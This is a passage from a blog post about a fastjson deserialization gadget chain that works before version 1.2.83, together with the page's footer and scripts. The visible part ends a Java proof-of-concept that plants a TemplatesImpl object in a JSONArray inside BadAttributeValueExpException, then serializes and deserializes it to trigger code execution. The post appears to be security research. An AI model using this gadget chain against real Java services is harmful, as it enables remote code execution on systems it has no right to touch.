&quot;1&quot;);</span><br><span class="line">        setValue(templates, &quot;_tfactory&quot;, null);</span><br><span class="line"></span><br><span class="line">        JSONArray jsonArray = new JSONArray();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);</span><br><span class="line">        setValue(bd,&quot;val&quot;,jsonArray);</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Object&gt; arrayList = new ArrayList&lt;&gt;();</span><br><span class="line">        arrayList.add(templates);</span><br><span class="line">        arrayList.add(bd);</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(arrayList);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/Mouri-Kogorou">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#fastjson-1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80"><span class="toc-number">1.</span> <span class="toc-text">fastjson 1.2.83版本前通杀</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-48%E4%B9%8B%E5%89%8D"><span class="toc-number">1.1.</span> <span class="toc-text">1.2.48之前</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-48%E4%B9%8B%E5%90%8E"><span class="toc-number">1.2.</span> <span class="toc-text">1.2.48之后</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/09/1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/09/1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80/&text=1.2.83版本前通杀"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/09/1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80/&title=1.2.83版本前通杀"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/09/1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80/&is_video=false&description=1.2.83版本前通杀"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=1.2.83版本前通杀&body=Check out this article: http://example.com/2025/01/09/1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/09/1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80/&title=1.2.83版本前通杀"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/09/1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80/&title=1.2.83版本前通杀"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/09/1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80/&title=1.2.83版本前通杀"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/09/1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80/&title=1.2.83版本前通杀"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/09/1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80/&name=1.2.83版本前通杀&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/09/1-2-83%E7%89%88%E6%9C%AC%E5%89%8D%E9%80%9A%E6%9D%80/&t=1.2.83版本前通杀"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2003-2025
+    Mouri-Kogorou
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">Home</a></li><!--
+    --><!--
+      --><li><a href="/about/">About</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Writing</a></li><!--
+    --><!--
+      --><li><a target="_blank" rel="noopener" href="https://github.com/Mouri-Kogorou">Projects</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
